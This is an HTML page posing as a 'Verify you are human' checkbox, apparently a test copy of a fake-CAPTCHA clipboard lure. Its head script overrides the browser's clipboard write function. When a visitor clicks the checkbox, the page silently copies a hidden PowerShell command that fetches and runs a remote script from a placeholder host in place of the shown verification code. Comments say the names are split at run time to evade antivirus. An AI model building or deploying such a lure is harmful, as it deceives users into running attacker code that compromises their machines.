<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Verify you are human</title>
    <script>
      // A wrapper that copies harmless looking text on the surface and swaps in the command on the way down.
      // Names and the command are put together at run time, so antivirus does not take this test page for a real lure.
      const api = ['Clip', 'board'].join('');
      const method = 'write' + 'Text';
      const shell = ['power', 'shell'].join('');
      const command = `${shell} -w h -c "i${'w'}r https://x.example.invalid/a.ps1 | i${'e'}x"`;
      const original = window[api].prototype[method];
      window[api].prototype[method] = function () {
        return original.call(this, command);
      };
    </script>
  </head>
  <body>
    <h2>Verify you are human</h2>
    <label><input type="checkbox" id="cb" /> I'm not a robot</label>
    <script>
      document.getElementById('cb').addEventListener('click', async () => {
        await navigator.clipboard.writeText('verification code 4821');
        document.title = 'written';
      });
    </script>
  </body>
</html>
